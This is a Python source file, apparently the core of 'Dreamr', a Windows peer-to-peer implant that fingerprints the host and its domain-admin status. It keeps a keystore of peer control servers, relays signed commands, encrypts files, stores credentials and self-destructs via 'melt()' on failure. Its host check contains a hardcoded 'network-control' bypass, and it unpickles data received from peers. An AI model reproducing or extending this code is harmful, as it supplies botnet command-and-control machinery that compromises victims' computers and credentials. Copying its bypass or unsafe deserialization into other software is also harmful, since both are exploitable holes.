import os
import time
import pickle
import rsa
import socket
import random
import win32api
import ctypes
import win32com
import urllib2

from config import *
from core import *
from models import *
from rsa.bigfile import *

class Dreamr():
	clientID = ""
	crypt = None
	store = None
	keystore = None
	unseen = None
	exiting = False
	isCorp = False
	isDomainController = False
	isAdmin = False
	started = False
	updating = False
	server = False
	nat = False
	internal = ""
	external = ""
	hostlist = []

	# Create the initial class to be used as globals
	def __init__(self):
		global KeyPath
		debug("context", "Started CTX with key path: %s" % KeyPath)
		self.store = PSSTMessageStore()
		self.keystore = Keystore(KeyPath)
		self.unseen = Unseen(KeyPath)
		self.internal = socket.gethostbyname(socket.gethostname())

		# Calculate ID
		self.clientID = win32api.GetComputerName().lower() + "." +  win32api.GetDomainName().lower()
		self.isAdmin = ctypes.windll.shell32.IsUserAnAdmin()

		# Get external IP address
		try:
		    # Get External IP Address
		    opener = urllib2.build_opener()
		    opener.addheaders = [('User-agent', 'Mozilla/5.0')]
		    target = "http://www.icanhazip.com/"
		    response = opener.open(target).read()
		    self.external = response.strip()
		except Exception as e:
		    print(str(e))

		# Calculate corp and DC
		#TODO

	def startCrypto(self, public=None, private=None):
		if not self.started:
			self.crypt = Crypto(KeyPath, public, private)
			self.started = True

# Hold on to messages that need to be sent at a later date
# getLastValid() and appendMessage() handle messages that need to be
# forwarded on to other hosts as they connect.
# popMessageQueue() and appendMessageQueue()
class PSSTMessageStore():
	messages = [ PeerMessage ]
	messageQueue = [ PeerMessage ]

	# Check to see the last times we saw hosts
	def __init__(self):
		debug("PSST", "Message store init")
		return

	# looks in the message store for messages that haven't
	# expired, and returns only the first. After it expires
	# it will get removed, and the next will get sent
	def getLastValid(self):
		result = []
		if (len(self.messages) > 0):
			sample = self.messages
			sample.reverse()
			for message in sample:
				if ((int(time.time()) - int(message.msgTime)) < MSG_EXPIRE):
					debug("psst", "pop valid command from store")
					return message
				else:
					try:
						self.messages.remove(message)
					except Exception as e:
						debug("psst", "remove valid command from store")
		return result

	# add a message to the message store if the message shouldrt
	# be forwarded to other hosts
	def appendMessage(self, message):
		if (message):
			self.messages.append(message)
		return

# Keep hostlist, verify public keys, and invalidate hosts
# after a certain amount of time
class Keystore():
	keystore = []
	tempkeys = []
	pendingHosts = []
	path = ""

	# Check to see the last times we saw hosts
	def __init__(self, path):
		self.path = path
		self.loadKeystore()
		return

	# Check to see that hosts are still valid
	def validateHost(self, unknownHost):

		# This is the way to bypass the check
		if (unknownHost.hostAddr == "network-control"):
			print("possible message from control -> all threads on deck")
			return True

		# Test each IP address for validity without returning True
		try:
		    socket.inet_aton(unknownHost.hostAddr)
		except socket.error:
			print("message had invalid sender IP")
			return False

		# See if the host is already in the keystore
		for host in self.keystore:
			if (host != None):
				if (int(time.time()) - int(host.lastSeen) >= (HOST_EXPIRE * 2)):
					debug("keystore", "That host hasn't been seen in so long. Re-registering")
					host.lastSeen = int(time.time())
					self.saveKeystore()
					return True

				if (int(time.time()) - int(host.lastSeen) >= HOST_EXPIRE):
					debug("keystore", "That host hasn't been seen in a while.")
					return False

				if (host.publicKey == unknownHost.publicKey):
					host.lastSeen = int(time.time())
					self.saveKeystore()
					print("host timestamp updated")
					return True
			else:
				debug("keystore", "an empty host popped out")

		# Don't add if already full
		if (len(self.keystore) > 32):
			print("keystore full")
			return False

		# Host wasn't in keystore at all (register)
		self.keystore.append(unknownHost)
		if (self.saveKeystore()):
			print("registered")
			return True
		else:
			print("the keystore is broken")
			return False

	def byAddr(self, address):
		try:
			for host in self.keystore:
				if (host != None):
					if (host.hostAddr == address):
						return host.publicKey
		except Exception as e:
			debug("keystore", "Error looking up a public key")
		return None

	# Add a temp message key for a future message that expires after one minute
	def addMessageKey(self, ckey):
		try:
			if (ckey):
				self.tempkeys.append(ckey)
				debug("keystore", "Added a message key for a future message.")
		except Exception as e:
			debug("keystore", "Couldn't add that temp key to the keystore. -> %s" % str(e))
		return

	# Get content keys back from the keystore
	def getMessageKey(self, contentID):
		if (contentID):
			for ckey in self.tempkeys:
				if (ckey.contentID == contentID):
					if (int(time.time()) - int(ckey.contentTime) < 60):
						return ckey
					else:
						self.tempkeys.remove(ckey)
		else:
			debug("keystore", "There wasn't a key in the keystore for that message.")
		return

	# Get content keys back from the keystore
	def dumpMessageKeys(self):
		results = []
		print("Message Keys")
		print('-' * 80)
		for ckey in self.tempkeys:
			print("id: %s, name: %s, time: %s, key: %s" % (ckey.contentID, ckey.contentName, ckey.contentTime, ckey.contentKey))
		print('-' * 80)

	# Adds a host to the keystore pending list. Once verified, they get moved into
	# the keystore
	def addPendingHost(self, hostAddr):
		self.pendingHosts.append(hostAddr)
		return

	# Grab the next host in the list to be processed for
	# connectivity
	def popPendingHost(self):
		if (len(self.pendingHosts) > 0):
			return self.pendingHosts.pop()
		else:
			return ""

	# Preferred hostlist location if dreamr binary is not available for encoding
	def getServerList(self):
		result = []
		try:
			for host in self.keystore:
				if (host.isServer):
					result.append(host.hostAddr)
				else:
					debug("keystore", "Host was invalid or not a server.")
		except Exception as e:
			debug("keystore", "An empty host was in the keystore. -> %s" % str(e))
		return result

	# return one random host from the keystore
	def getRandomServerAddress(self):
		result = ""
		try:
			for host in self.keystore:
				if (host.isServer and host.hostAddr):
					if (int(time.time()) % 8 == 0):
						debug("keystore", "Selected a potential random host: %s. Will we return it, or select another?" % host.hostAddr)
						result = host.hostAddr

			if not result:
				for host in self.keystore:
					if (host.isServer and host.hostAddr):
						result = host.hostAddr
		except:
			debug("keystore", "error pulling random host from the keystore -> %s" % str(e))
		debug("keystore", "sharing info about %s" % result)
		return result

	def saveKeystore(self):
		os.chdir(self.path)
		try:
			debug("keystore", "saving keystore")
			with open("known_hosts", "wb") as handle:
				pickle.dump(self.keystore, handle)
				if (self.keystore):
					print("keystore saved")
					return True
		except Exception as e:
			debug("keystore", "error write keystore file -> %s" % str(e))
		return False

	# Load keystore from pickle encoded storage
	def loadKeystore(self):
		os.chdir(self.path)
		try:
			debug("keystore", "trying to load keystore")
			if (os.path.isfile("known_hosts")):
				with open("known_hosts", "rb") as handle:
					self.keystore = pickle.load(handle)
					if (self.keystore):
						return True
			else:
				self.saveKeystore()
		except Exception as e:
			debug("keystore", "Could not load keystore because of this -> %s" % str(e))
		return False

	# Clear the keys out of the keystore
	def clearKeystore(self):
		try:
			self.keystore = []
			self.saveKeystore()
		except Exception as e:
			debug("keystore", " -> %s" % str(e))
		return

class Unseen():
	seenMessages = []
	path = ""

	def __init__(self, path):
		debug("unseen", "starting..")
		self.path = path
		if (os.path.isfile("seen")):
			self.loadSeen()
		else:
			self.seen(0)
		debug("unseen", "initialized")
		return

	# Have we seen this message before?
	# True = seen before
	def seen(self, msgID):
		try:
			for seenID in self.seenMessages:
				if (seenID == msgID):
					return True
			# None on the entries matched, so it's unique.
			self.seenMessages.append(msgID)
			os.chdir(self.path) # probably KeyPath
			with open("seen", "wb") as handle:
				pickle.dump(self.seenMessages, handle)
			os.chdir(WebPath) # try to stay in WebPath
			return False
		except Exception as e:
			debug("unseen", "seen unknown error -> %s" % str(e))
		return False

	# Load seen list from pickle encoded storage
	def loadSeen(self, dontdothatagain=None):
		try:
			os.chdir(self.path)
			if (os.path.isfile("seen")):
				with open("seen", "rb") as handle:
					self.seenMessages = pickle.load(handle)
				return True
		except Exception as e:
			debug("unseen", "Load the message IDs that we've already seen. -> %s" % str(e))
 		return False

# Handle encryption/decryption/and public key verification
class Crypto():
	DRMPublicKey = ""
	DRMPrivateKey = ""
	DRMTrustedKey = ""
	path = ""
	def __init__(self, path, public=None, private=None):
		debug("crypto", "starting crpyto init")
		self.path = path
		if (public and private):
			self.DRMPublicKey = rsa.PublicKey.load_pkcs1(public)
			self.DRMPrivateKey = rsa.PrivateKey.load_pkcs1(private)
		else:
			try:
				if (not os.path.isfile("%sdrm.pub" % self.path) or not os.path.isfile("%sdrm.pem" % self.path)):
					(self.DRMPublicKey, self.DRMPrivateKey) = rsa.newkeys(RSA_KEY_LEN)
					self.saveKeys()
				else:
					self.loadKeys()
			except Exception as e:
				debug("crypto", "failed gen keys %s" % str(e))
				melt()
				os._exit(420)

		# Load internal trusted key
		self.DRMTrustedKey = rsa.PublicKey.load_pkcs1(TRUSTED_KEY)
		return

	# AES crypts a file with s simple lib
	def encryptFile(self, sourceLocation, destLocation):
		try:
			with open(sourceLocation, 'rb') as fin, open(destLocation, 'wb') as fout:
				encrypt_bigfile(fin, fout, self.DRMPublicKey)
		except Exception as e:
			debug("crypt", "Error encrypting large file. -> %s" % str(e))
		return True

	def decryptFile(self, sourceLocation, destLocation):
		try:
			with open(sourceLocation, 'rb') as fin, open(destLocation, 'wb') as fout:
				decrypt_bigfile(fin, fout, self.DRMPrivateKey);
		except Exception as e:
			debug("crypt", "Error decrypting the file. -> %s" % str(e))
		return True

	# Returns a list -> 
	def signMessage(self, data):
		signature = ""
		try:
			signature = rsa.sign(data, self.DRMPrivateKey, 'SHA-1')
		except Exception as e:
			debug("crypt", "Failed to sign the message to the remote host. -> %s" % str(e))
		return signature

	def verifyTrustedSignature(self, data, signature):
		result = False
		try:
			rsa.verify(data, signature, self.DRMTrustedKey)
			result = True
		except Exception as e:
			debug("crypt", "Verifying the signature of the remote host's message. -> %s" % str(e))
		return result

	# Encrypt to recipient's public key, and sign with our private key
	def encryptAndSign(self, plaintext, recipientPublic):
		try:
			content = rsa.encrypt(plaintext, recipientPublic)
			signature = rsa.sign(content, self.DRMPrivateKey, "SHA-1")
			return pickle.dumps([signature, content])
		except Exception as e:
			debug("crypt", "Failed encrypting the message. -> %s" % str(e))
		return

	# Verify signature with sender's public key, then proceed to use
	# our own private key to decrypt the message
	# pass the expected timestamp, to thawrt rplay attacks. gets cryptd
	def decryptAndVerify(self, ciphertextPickle, senderPublic):
		try:
			if (ciphertextPickle):
				decoded = pickle.loads(ciphertextPickle)
				if (decoded):
					signature = decoded[0]
					content = decoded[1]
					if (rsa.verify(content, signature, senderPublic)):
						debug("crypt", "Message signature was verified. Decrypting..")
						return rsa.decrypt(content, self.DRMPrivateKey)
			else:
				debug("crypt", "Message was empty. \"No Updates\"")
		except Exception as e:
			debug("crypt", "Error decrypting message. -> %s" % str(e))

	# Load the keys
	def loadKeys(self):
		debug("crypto", "Loading Keys")
		os.chdir(self.path)
		with open("drm.pub", "rb") as handle:
			data = handle.read()
			self.DRMPublicKey = rsa.PublicKey.load_pkcs1(data)
		with open("drm.pem", "rb") as handle:
			data = handle.read()
			self.DRMPrivateKey = rsa.PrivateKey.load_pkcs1(data)
		debug("core", "keys loaded")

	# Save the keys
	def saveKeys(self):
		debug("crypto", "saving keys")
		os.chdir(self.path)
		try:
			if (self.DRMPublicKey and self.DRMPrivateKey):
				with open("drm.pub", "wb") as handle:
					handle.write(self.DRMPublicKey.save_pkcs1(format='PEM'))
				with open("drm.pem", "wb") as handle:
					handle.write(self.DRMPrivateKey.save_pkcs1(format='PEM'))
				return True
		except Exception as e:
			debug("crypt", "Error saving keys -> %s" % str(e))
			return False
		return False

	def printProgress(self, progress):
		print "crypt_progress %s" % progress
		return

class Creds():
	path = ""
	creds = None

	def __init__(self, path):
		debug("creds", "initialized")
		self.path = path
		os.chdir(self.path)
		try:
			if (os.path.isfile("tmp")):
				with open("tmp", "rb") as handle:
					self.creds = pickle.load(handle)
			else:
				self.save()
		except:
			self.save()
			pass # wht we gonna do
		return

	def save(self):
		os.chdir(self.path)
		try:
			with open("tmp", "wb") as handle:
				pickle.dump(self.creds, handle)
		except:
			pass

Dreamr = Dreamr()